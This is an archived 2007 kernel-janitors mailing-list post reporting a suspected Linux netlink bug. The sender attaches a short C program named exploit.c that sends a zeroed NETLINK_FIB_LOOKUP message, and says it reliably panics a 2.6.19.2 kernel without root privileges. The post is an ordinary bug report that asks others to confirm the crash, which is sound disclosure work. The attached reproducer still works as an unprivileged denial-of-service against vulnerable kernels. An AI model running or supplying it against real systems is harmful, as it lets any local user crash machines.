From: Jaco Kroon <jaco@kroon.co.za>
Date: Wed, 25 Apr 2007 14:41:44 +0000
Subject: [KJ] netlink bug?
Message-Id: <462F68A8.5090803@kroon.co.za>
MIME-Version: 1
Content-Type: multipart/mixed; boundary="------------050609060206090103040005"
List-Id: <kernel-janitors.vger.kernel.org>
To: kernel-janitors@vger.kernel.org

This is a multi-part message in MIME format.
--------------050609060206090103040005
Content-Type: text/plain; charset=ISO-8859-1; format=flowed
Content-Transfer-Encoding: 7bit

Hi guys,

I've got a piece of code that seems to reliably cause the kernel to 
panic, looks like a problem somewhere down the netlink core...

I've been trying to use NETLINK_FIB_LOOKUP but so far the closest I've 
come to success was a kernel crash, a slightly stripped down version of 
the code that first crashed it attached.  If somebody else can confirm 
this it would be appreciated, also, any pointers on what I'm doing wrong 
that triggers the behaviour to begin with would be appreciated, thanks.

I'm currently on kernel version 2.6.19.2, so this may have been fixed in 
the meantime.  Note that I don't need to run the code as root in order 
to trigger the crash.

Jaco

--------------050609060206090103040005
Content-Type: text/x-csrc;
 name="exploit.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: inline;
 filename="exploit.c"

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <memory.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>

/* stolen from kernel source ... could be a problem here ... */
struct fib_result_nl {
	uint32_t        fl_addr;   /* To be looked up*/
	uint32_t        fl_fwmark;
	unsigned char   fl_tos;
	unsigned char   fl_scope;
	unsigned char   tb_id_in;

	unsigned char   tb_id;      /* Results */
	unsigned char   prefixlen;
	unsigned char   nh_sel;
	unsigned char   type;
	unsigned char   scope;
	int             err;
};

struct msg {
	struct nlmsghdr nh;
	struct fib_result_nl frn;
};

int main()
{
	struct msg msg;
	struct sockaddr_nl sa;
	int fd;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_pid = getpid();

	assert((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_FIB_LOOKUP)) > 0);
	assert(bind(fd, (struct sockaddr*)&sa, sizeof(sa)) == 0);

	sa.nl_pid = 0;
	memset(&msg, 0, sizeof(msg));
	msg.nh.nlmsg_len = sizeof(msg);
	msg.nh.nlmsg_flags = NLMSG_DONE;

	assert(sendto(fd, &msg, sizeof(msg), 0, (void*)&sa, sizeof(sa)) > 0);

	return 0;
}

--------------050609060206090103040005
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Kernel-janitors mailing list
Kernel-janitors@lists.linux-foundation.org
https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
--------------050609060206090103040005--
